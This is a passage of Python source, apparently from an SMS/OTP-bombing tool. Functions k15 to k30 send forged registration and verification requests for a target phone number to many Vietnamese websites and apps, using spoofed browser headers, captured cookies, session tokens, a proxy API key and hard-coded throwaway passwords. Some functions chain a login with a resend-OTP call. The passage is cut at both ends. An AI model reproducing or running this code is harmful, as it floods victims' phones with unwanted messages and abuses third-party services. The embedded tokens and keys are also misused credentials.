    "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "x-requested-with":
    "XMLHttpRequest",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://www.mykingdom.com.vn",
    "sec-fetch-site":
    "same-origin",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://www.mykingdom.com.vn/customer/account/create/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie":
    "section_data_ids\u003d%7B%22cart%22%3A1682953052%2C%22customer%22%3A1682953053%7D"
  }
  Payload = {
    "email": f"{mail}%40gmail.com",
    "telephone": phone,
    "fullname": "Ahad+Kumar+undefined",
    "dob": "04%2F03%2F1999",
    "gender": "1"
  }
  response = requests.post(
    "https://www.mykingdom.com.vn/customer/account/registertelephonecheck/",
    headers=Headers,
    data=Payload)


def k15(phone):
  Headers = {
    "Host":
    "api.hanagold.vn",
    "content-length":
    "93",
    "accept":
    "application/json",
    "content-type":
    "application/json",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "token":
    "null",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://hanagold.vn",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://hanagold.vn/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({
    "email": "",
    "mobile": phone,
    "fullname": "Nguyễn Văn Cường",
    "password": "Vrxx#1337"
  })
  response = requests.post("https://api.hanagold.vn/app/auth/register",
                           headers=Headers,
                           data=Datason)


def k16(phone):
  Headers = {
    "Host":
    "api.gapo.vn",
    "content-length":
    "31",
    "content-type":
    "application/json",
    "sec-ch-ua-mobile":
    "?1",
    "authorization":
    "Bearer",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "accept":
    "*/*",
    "origin":
    "https://www.gapo.vn",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://www.gapo.vn/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({
    "device_id": "30a1bfa0-533f-45e9-be60-b48fb8977df2",
    "phone_number": f"+84-" + phone[1:11],
    "otp_type": 0
  })
  response = requests.post("https://api.gapo.vn/auth/v2.0/signup",
                           headers=Headers,
                           data=Datason)


def k17(phone):
  Headers = {
    "Host":
    "api.kilo.vn",
    "content-length":
    "54",
    "app-version":
    "1",
    "x-correlation-id":
    "d5afa9c6-73cb-47bf-ad42-0672912b725b",
    "sec-ch-ua-mobile":
    "?1",
    "authorization":
    "Bearer undefined",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "content-type":
    "application/json",
    "accept":
    "application/json",
    "i18next-language":
    "vi",
    "api-version":
    "2",
    "platform":
    "SELLER_WEB",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://seller.kilo.vn",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://seller.kilo.vn/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({
    "phone": phone,
    "email": f"{random_string(6)}@gmail.com"
  })
  response = requests.post("https://api.kilo.vn/users/check-new-user",
                           headers=Headers,
                           data=Datason)


def k18(phone):
  Headers = {
    "Host":
    "api.vietluck.vn",
    "Connection":
    "keep-alive",
    "Content-Length":
    "108",
    "sec-ch-ua-mobile":
    "?1",
    "Authorization":
    "Bearer",
    "User-Agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Content-Type":
    "application/json",
    "Accept":
    "application/json, text/plain, */*",
    "platform":
    "web",
    "sec-ch-ua-platform":
    "\"Android\"",
    "Origin":
    "https://vietluck.vn",
    "Sec-Fetch-Site":
    "same-site",
    "Sec-Fetch-Mode":
    "cors",
    "Sec-Fetch-Dest":
    "empty",
    "Referer":
    "https://vietluck.vn/",
    "Accept-Encoding":
    "gzip, deflate, br",
    "Accept-Language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({
    "phoneNumber": phone,
    "password": "Vrxx#1337",
    "acceptedTerms": True,
    "captchaValue": "dcm",
    "shareCode": ""
  })
  response = requests.post("https://api.vietluck.vn/api/v1/auth/register",
                           headers=Headers,
                           data=Datason)
  if "Account is already in use" in response.text:
    Header = {
      "Host":
      "api.vietluck.vn",
      "Connection":
      "keep-alive",
      "Content-Length":
      "108",
      "sec-ch-ua-mobile":
      "?1",
      "Authorization":
      "Bearer",
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
      "Content-Type":
      "application/json",
      "Accept":
      "application/json, text/plain, */*",
      "platform":
      "web",
      "sec-ch-ua-platform":
      "\"Android\"",
      "Origin":
      "https://vietluck.vn",
      "Sec-Fetch-Site":
      "same-site",
      "Sec-Fetch-Mode":
      "cors",
      "Sec-Fetch-Dest":
      "empty",
      "Referer":
      "https://vietluck.vn/",
      "Accept-Encoding":
      "gzip, deflate, br",
      "Accept-Language":
      "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
    }
    Datason = json.dumps({"phoneNumber": phone, "password": "Vrxx#1337"})
    response = requests.post("https://api.vietluck.vn/api/v1/auth",
                             headers=Header,
                             data=Datason)
    authtoken = response.text.split('{"authToken":"')[1].split('","')[0]
    Head = {
      "Host":
      "api.vietluck.vn",
      "Connection":
      "keep-alive",
      "Accept":
      "application/json, text/plain, */*",
      "platform":
      "web",
      "sec-ch-ua-mobile":
      "?1",
      "Authorization":
      f"Bearer {authtoken}",
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform":
      "\"Android\"",
      "Origin":
      "https://vietluck.vn",
      "Sec-Fetch-Site":
      "same-site",
      "Sec-Fetch-Mode":
      "cors",
      "Sec-Fetch-Dest":
      "empty",
      "Referer":
      "https://vietluck.vn/",
      "Accept-Encoding":
      "gzip, deflate, br",
      "Accept-Language":
      "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
    }
    r = requests.get("https://api.vietluck.vn/api/v1/auth/resendOtp",
                     headers=Head)
  else:
    pass


def k19(phone):
  Headers = {
    "Host":
    "api.swift247.vn",
    "content-length":
    "23",
    "accept":
    "application/json, text/plain, */*",
    "content-type":
    "application/json",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://app.swift247.vn",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://app.swift247.vn/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({"phone": f"84{phone[1:11]}"})
  response = requests.post("https://api.swift247.vn/v1/check_phone",
                           headers=Headers,
                           data=Datason)
  if "OTP_NO_CONFIRMED" in response.text:
    Headers = {
      "Host":
      "api.swift247.vn",
      "content-length":
      "23",
      "accept":
      "application/json, text/plain, */*",
      "content-type":
      "application/json",
      "sec-ch-ua-mobile":
      "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform":
      "\"Android\"",
      "origin":
      "https://app.swift247.vn",
      "sec-fetch-site":
      "same-site",
      "sec-fetch-mode":
      "cors",
      "sec-fetch-dest":
      "empty",
      "referer":
      "https://app.swift247.vn/",
      "accept-encoding":
      "gzip, deflate, br",
      "accept-language":
      "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
    }
    Datason = json.dumps({"phone": f"84{phone[1:11]}"})
    response = requests.post("https://api.swift247.vn/v1/request_new_otp",
                             headers=Headers,
                             data=Datason)
  else:
    pass


def k20(phone):
  Headers = {
    "Host":
    "bibabo.vn",
    "Connection":
    "keep-alive",
    "Content-Length":
    "64",
    "Accept":
    "*/*",
    "Content-Type":
    "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "X-Requested-With":
    "XMLHttpRequest",
    "sec-ch-ua-mobile":
    "?1",
    "User-Agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "Origin":
    "https://bibabo.vn",
    "Sec-Fetch-Site":
    "same-origin",
    "Sec-Fetch-Mode":
    "cors",
    "Sec-Fetch-Dest":
    "empty",
    "Referer":
    "https://bibabo.vn/user/signupPhone",
    "Accept-Encoding":
    "gzip, deflate, br",
    "Accept-Language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "Cookie":
    "_ui_bi_\u003deyJpdiI6IlQyam9wWko1MGRQVXNTMnZOZEZpWGc9PSIsInZhbHVlIjoiYjV5SlR1V0tVbjdFNFwvK2FBUzIwbWZWT0YzOUdvR2cyQzZKQXI5OHFKOHM9IiwibWFjIjoiZmFiZWVkOTA0ZmE3NjJkZTRhMzI4MGQ0OWQxMTBjMmZmZjQ2ZTc0ZGYxODhlMmFiNTMwMzVlZjc0Y2MyMTg2NCJ9; _ga\u003dGA1.2.55963624.1683002314; _gid\u003dGA1.2.593754343.1683002314; mp_376a95ebc99b460db45b090a5936c5de_mixpanel\u003d%7B%22distinct_id%22%3A%20%22%24device%3A187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24device_id%22%3A%20%22187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2Fhome%22%2C%22%24initial_referring_domain%22%3A%20%22bibabo.vn%22%7D; _gat\u003d1; gaVisitorUuid\u003d47008ca1-32a0-4daa-9694-e36807c4dd91; _fbp\u003dfb.1.1683002315008.1108739564; XSRF-TOKEN\u003deyJpdiI6InNtOGtVeHBSZmVoQjR0N1wvRW1hckF3PT0iLCJ2YWx1ZSI6IlNLQ0p3UFlUZGhjdENKSFM1cHdLeXJGcFVGaE1EaDNKa0VRNk40cWo1enFCTERSTVowaEczSzc0WitTNks4am9VcE40KzAzVCtwbUVkeGVZUE1mcER3PT0iLCJtYWMiOiIzYzAxZGZmNzMxOWM3NWExOTY1MmFmYjNkMzhiOGM4OGNhMDQxNmRhZDA4YTY2ZmZhOTNjY2RhN2FiZjZlOTVmIn0%3D; laravel_session\u003deyJpdiI6Ind5blczNnFrMzRWbTJEbDRVcGNRaXc9PSIsInZhbHVlIjoiZXQyQUJoS3NuTXd4RUljMEhLQUZkS0Q0MEdSdGUrb09PdURXSm03d2xOS2pDRThjbERCUzlyeEpTR3VHTVUxOXd0UTVOVnppXC92WVFyOTZKS240KzBnPT0iLCJtYWMiOiJjMWQ5MWQ5YjdjYTZlODc5MjI2YmNjZTM5YjZlMWVmMThiYmRlMTIzYTI1M2E1YmIzZDc5MDExNGJlODRhYjUwIn0%3D"
  }
  Payload = {
    "phone": phone,
    "_token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"
  }
  response = requests.post("https://bibabo.vn/user/verify-phone",
                           headers=Headers,
                           data=Payload)


def k21(phone):
  Headers = {
    "Host": "webapi.mytv.vn",
    "Connection": "keep-alive",
    "Content-Length": "59",
    "Accept-Language": "vi",
    "sec-ch-ua-mobile": "?1",
    "Authorization":
    "Basic eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtYW51ZmFjdHVyZXJfaWQiOiI5ZmM5MWU1MGRhMTczNDI0NGZiZDBhYzBiNmQ5MTNhZCIsIm1lbWJlcl9pZCI6ImFub255bW91cy05ZmM5MWU1MGRhMTczNDI0NGZiZDBhYzBiNmQ5MTNhZCIsImlhdCI6MTY4MzAwMjY5M30.1zJ-pDbUQDHqcxlVK-rkRXgMYcSL7rQbM3c35MBg1xc",
    "User-Agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "macaddress": "83ae91e586df520173eef45d69bd01c8",
    "Access-Control-Allow-Origin": "*",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "withCredentials": "true",
    "sec-ch-ua-platform": "\"Android\"",
    "Origin": "https://mytv.com.vn",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://mytv.com.vn/",
    "Accept-Encoding": "gzip, deflate, br"
  }
  Params = {
    "uuid": "a40c065236404318da3d4a8a81d18b12",
    "time": "2023y05m02d_11h46m01s978ms"
  }
  Datason = json.dumps({
    "login_type": 1,
    "email": "",
    "phone": phone,
    "type": 3
  })
  response = requests.post("https://webapi.mytv.vn/api/v1/auth/sendOTP",
                           params=Params,
                           data=Datason,
                           headers=Headers)


def k22(phone):
  Headers = {
    "Host": "book.heyu.vn",
    "content-length": "82",
    "app-version": "58524",
    "sec-ch-ua-mobile": "?0",
    "authorization": "d85c4cc85077c7d67ecf9e4db280896d",
    "user-agent":
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "content-type": "application/json",
    "accept": "application/json, text/plain, */*",
    "sec-ch-ua-platform": "\"Linux\"",
    "origin": "https://book.heyu.vn",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://book.heyu.vn/login",
    "accept-encoding": "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie": "_ga\u003dGA1.1.1856524365.1683003656"
  }
  Datason = json.dumps({
    "phone": phone,
    "regionName": "",
    "nativeVersion": 2026,
    "reqT": 1683003682771
  })
  response = requests.post("https://book.heyu.vn/api/sms/send-code",
                           headers=Headers,
                           data=Datason)


def k23(phone):
  Headers = {
    "Host":
    "id.zing.vn",
    "Connection":
    "keep-alive",
    "Content-Length":
    "139",
    "sec-ch-ua-platform":
    "\"Android\"",
    "sec-ch-ua-mobile":
    "?1",
    "User-Agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Content-Type":
    "application/x-www-form-urlencoded",
    "Accept":
    "*/*",
    "Origin":
    "https://id.zing.vn",
    "Sec-Fetch-Site":
    "same-origin",
    "Sec-Fetch-Mode":
    "cors",
    "Sec-Fetch-Dest":
    "empty",
    "Referer":
    "https://id.zing.vn/v2/smsnotify?apikey\u003d92140c0e46c54994812403f564787c14\u0026pid\u003d38\u0026next\u003dhttps%3A%2F%2Fid.zing.vn%2Fv2%2Finfosetting%3Fapikey%3D92140c0e46c54994812403f564787c14%26pid%3D38",
    "Accept-Encoding":
    "gzip, deflate, br",
    "Accept-Language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "Cookie":
    "_ga\u003dGA1.2.1839719404.1682954368; _gid\u003dGA1.2.1277384557.1682954368; key_access_reg\u003d116.110.8.54.1683004011580; vngauth\u003dAQGck76aUGTleo0nE5%2BLJ2N6Phg%3D; ZAUTH\u003d; acn\u003dVexx2903; uin\u003do0663583461; justreg\u003d1; _gat\u003d1"
  }
  Payload = {
    "phone": phone,
    "appName": "",
  }
  response = requests.post("https://id.zing.vn/v2/smsnotify/sendsms",
                           headers=Headers,
                           data=Payload)


def k24(phone):
  Headers = {
    "Host": "api.glxplay.io",
    "content-length": "0",
    "x-requested-with": "XMLHttpRequest",
    "accept-language": "vi",
    "sec-ch-ua-mobile": "?1",
    "access-token":
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiIwYzY0MmRkZC1lNDE2LTQzNTMtYTU1OS0yYjcyMTk3ZDBiMmYiLCJkaWQiOiJhYTI0ZDg5Yy0yYjdlLTRmNjUtOTY4Yy1kMDdmNzc5YjA3YmQiLCJpcCI6IjExNi4xMTAuOC41NCIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfGFuZHJvaWR8MTB8Y2hyb21lIiwiYXBwX3ZlcnNpb24iOiIyLjAuMCIsImlhdCI6MTY4MzAwNDk4MSwiZXhwIjoxNjk4NTU2OTgxfQ.Jas3tSdW0PHLQFa97ZMRQLD1EX5Uq4weXodG-54OHcI",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "accept": "*/*",
    "origin": "https://galaxyplay.vn",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://galaxyplay.vn/",
    "accept-encoding": "gzip, deflate, br"
  }
  response = requests.post(
    f"https://api.glxplay.io/account/phone/verify?phone={phone}",
    headers=Headers)


def k25(phone):
  proxy = "http://9abf8e9bd90b41dd23687146da590a43751761ee:js_render=true@proxy.zenrows.com:8001"
  proxies = {"http": proxy, "https": proxy}
  response = requests.get(
    f"https://m.batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber={phone}",
    proxies=proxies,
    verify=False)


def k26(phone):
  Headers = {
    "Host":
    "api.thitruongsi.com",
    "content-length":
    "641",
    "accept":
    "application/json, text/plain, */*",
    "content-type":
    "application/json",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://m.thitruongsi.com",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://m.thitruongsi.com/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({
    "account_phone": phone,
  })
  response = requests.post(
    "https://api.thitruongsi.com/v1/user/api/v4/users/register/step1-phone",
    headers=Headers,
    data=Datason)


def k27(phone):
  Headers = {
    "Host": "voso.vn",
    "content-length": "244",
    "accept": "application/json, text/javascript, */*; q\u003d0.01",
    "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://voso.vn",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://voso.vn/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie": "_hjAbsoluteSessionInProgress\u003d0"
  }
  Payload = {
    "name":
    "Nguyen+Van+Tuan+Anh",
    "email":
    f"botvexzxje2@gmail.com",
    "phone":
    phone,
    "step":
    "1",
    "otp":
    "",
    "resendotp":
    "0",
    "otpToken":
    "",
    "password":
    "Vrxx#1337",
    "repassword":
    "Vrxx#1337",
    "_csrf":
    "_BXHlLomLJsUPjoAGs61hC-B0xJrzBlzFXUvG_PwnC6vJo3lyB4d8URUbnQtvt7uXrflUAq-TjJNIlZxscT2Tw%3D%3D"
  }
  response = requests.post("https://voso.vn/auth/signupv2",
                           headers=Headers,
                           data=Payload)


def k28(phone):
  Headers = {
    "Host":
    "production-account.riviu.co",
    "content-length":
    "63",
    "app_version":
    "3.1.6",
    "device_id":
    "3723142086",
    "language":
    "vi",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "content-type":
    "application/json;charset\u003dUTF-8",
    "region_uuid":
    "112f7e2e9da240be937daa66b1c4d1ce",
    "accept":
    "application/json, text/plain, */*",
    "platform":
    "web",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://riviu.vn",
    "sec-fetch-site":
    "cross-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://riviu.vn/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({
    "country_prefix": "+84",
    "phone": phone[1:11],
    "action": "register"
  })
  response = requests.post(
    "https://production-account.riviu.co/v1.0/otp/generate",
    headers=Headers,
    data=Datason,
    verify=False)


def k29(phone):
  Headers = {
    "Host":
    "vtcpay.vn",
    "Connection":
    "keep-alive",
    "Content-Length":
    "313",
    "X-XSRF-Token":
    "14o6Ue-_RMxYniYbciAz48pMiLYWPkxncVTguqWeLcGAbd_bIPAjxwPwJijb3tE2hLvE4HlAvqwrw84DGheOsmb1u5PjmXz4wiTTEsZuEqw1:m97hOPL_udp0iJZepU_LIPLmampDf7xv9rWHMVOBMF0wrUOIbKBq2hxBmvwxB19K-Zf6YcChwfNwuVl6k249Mjq2fQNT_ia4i3st2sBgb8M1",
    "sec-ch-ua-mobile":
    "?1",
    "User-Agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Content-Type":
    "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "Accept":
    "application/json, text/javascript, */*; q\u003d0.01",
    "X-Requested-With":
    "XMLHttpRequest",
    "sec-ch-ua-platform":
    "\"Android\"",
    "Origin":
    "https://vtcpay.vn",
    "Sec-Fetch-Site":
    "same-origin",
    "Sec-Fetch-Mode":
    "cors",
    "Sec-Fetch-Dest":
    "empty",
    "Referer":
    "https://vtcpay.vn/",
    "Accept-Encoding":
    "gzip, deflate, br",
    "Accept-Language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "Cookie":
    "language_ewallet\u003dvi; ASP.NET_SessionId\u003dndbafgflzg0exbtdvsfmrr1h; _ga\u003dGA1.1.1505129394.1683027952; __zi\u003d3000.SSZzejyD3ieeckglaWi1aIhEzE6S4qBDECJhyzu1LDfvcwtrtKyUsd2QhVQOJ1xSDPciyvL86DquC0.1; _fbp\u003dfb.1.1683027952653.496325536; i18next\u003dvi; _ga_MNCYC9QCEZ\u003dGS1.1.1683027952.1.1.1683027963.0.0.0"
  }
  Payload = {
    "accountName":
    phone,
    "dataInfo":
    "+ivYqHLRMd+HDCc2n36aX5gVDmqBYWQbUefdGMitLb42fzDsQU30d4cJXydOayyi35bHFX2i3j7/gW4mPUGw9LskY/oMYoGUrVx87qm7UmrZ6VpArDCZ6op7N6jVypse",
    "deviceDetail":
    "fingerprint:1570892670;devicebrowser:Chrome;OS:Android-10;device:android;devicetype:mobile;resolution:360x800"
  }
  response = requests.post("https://vtcpay.vn/AccountRegister/CreateAccount",
                           headers=Headers,
                           data=Payload)
  signex = response.text.split('"Extend":"')[1].split('","')[0]
  Head = {
    "Host":
    "vtcpay.vn",
    "Connection":
    "keep-alive",
    "Accept":
    "*/*",
    "X-XSRF-Token":
    "14o6Ue-_RMxYniYbciAz48pMiLYWPkxncVTguqWeLcGAbd_bIPAjxwPwJijb3tE2hLvE4HlAvqwrw84DGheOsmb1u5PjmXz4wiTTEsZuEqw1:m97hOPL_udp0iJZepU_LIPLmampDf7xv9rWHMVOBMF0wrUOIbKBq2hxBmvwxB19K-Zf6YcChwfNwuVl6k249Mjq2fQNT_ia4i3st2sBgb8M1",
    "X-Requested-With":
    "XMLHttpRequest",
    "sec-ch-ua-mobile":
    "?1",
    "User-Agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "Sec-Fetch-Site":
    "same-origin",
    "Sec-Fetch-Mode":
    "cors",
    "Sec-Fetch-Dest":
    "empty",
    "Referer":
    "https://vtcpay.vn/",
    "Accept-Encoding":
    "gzip, deflate, br",
    "Accept-Language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "Cookie":
    "language_ewallet\u003dvi; ASP.NET_SessionId\u003dndbafgflzg0exbtdvsfmrr1h; _ga\u003dGA1.1.1505129394.1683027952; __zi\u003d3000.SSZzejyD3ieeckglaWi1aIhEzE6S4qBDECJhyzu1LDfvcwtrtKyUsd2QhVQOJ1xSDPciyvL86DquC0.1; _fbp\u003dfb.1.1683027952653.496325536; i18next\u003dvi; _ga_MNCYC9QCEZ\u003dGS1.1.1683027952.1.1.1683027963.0.0.0"
  }
  r = requests.get(
    f"https://vtcpay.vn/AccountRegister/RegisterActiveAccount?dataInfo=+ivYqHLRMd+HDCc2n36aX5gVDmqBYWQbUefdGMitLb42fzDsQU30d4cJXydOayyi35bHFX2i3j7/gW4mPUGw9LskY/oMYoGUrVx87qm7UmrZ6VpArDCZ6op7N6jVypse&sign={signex}",
    headers=Head)


def k30(phone):
  Headers = {
    "Host":
    "id.icankid.vn",
    "Connection":
    "keep-alive",
    "Content-Length":
    "134",
    "sec-ch-ua-platform":
    "\"Android\"",
    "sec-ch-ua-mobile":
    "?1",
    "User-Agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "content-type":
    "application/json",
    "Accept":
    "*/*",
    "Origin":
    "https://id.icankid.vn",
    "Sec-Fetch-Site":
    "same-origin",
    "Sec-Fetch-Mode":
    "cors",
    "Sec-Fetch-Dest":
    "empty",
    "Referer":
    "https://id.icankid.vn/auth",
    "Accept-Encoding":
    "gzip, deflate, br",
    "Accept-Language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "Cookie":
